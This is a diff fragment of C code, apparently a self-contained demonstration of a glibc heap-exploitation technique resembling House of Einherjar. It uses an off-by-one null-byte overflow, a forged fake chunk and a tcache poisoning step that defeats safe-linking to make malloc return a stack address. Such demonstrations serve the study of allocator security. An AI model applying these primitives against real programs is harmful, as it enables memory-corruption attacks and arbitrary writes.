@@ -1,0 +1,42 @@
+36  intptr_t stack_var[0x10];
+37  intptr_t *target = NULL;
+
+40  for(int i=0; i<0x10; i++) {
+41      if(((long)&stack_var[i] & 0xf) == 0) {
+42          target = &stack_var[i];
+43          break;
+44      }
+45  }
+
+50  intptr_t *a = malloc(0x38);
+56  a[0] = 0;
+57  a[1] = 0x60;
+58  a[2] = (size_t) a;
+59  a[3] = (size_t) a;
+
+70  uint8_t *b = (uint8_t *) malloc(0x28);
+73  int real_b_size = malloc_usable_size(b);
+80  uint8_t *c = (uint8_t *) malloc(0xf8);
+84  uint64_t* c_size_ptr = (uint64_t*)(c - 8);
+92  b[real_b_size] = 0;
+102 size_t fake_size = (size_t)((c - sizeof(size_t) * 2) - (uint8_t*) a);
+104 *(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size;
+108 a[1] = fake_size;
+
+114 intptr_t *x[7];
+115 for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
+116     x[i] = malloc(0xf8);
+117 }
+120 for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
+121     free(x[i]);
+122 }
+
+125 free(c);
+130 intptr_t *d = malloc(0x158);
+136 uint8_t *pad = malloc(0x28);
+137 free(pad);
+140 free(b);
+146 d[0x30 / 8] = (long)target ^ ((long)&d[0x30/8] >> 12);
+
+150 malloc(0x28);
+151 intptr_t *e = malloc(0x28);
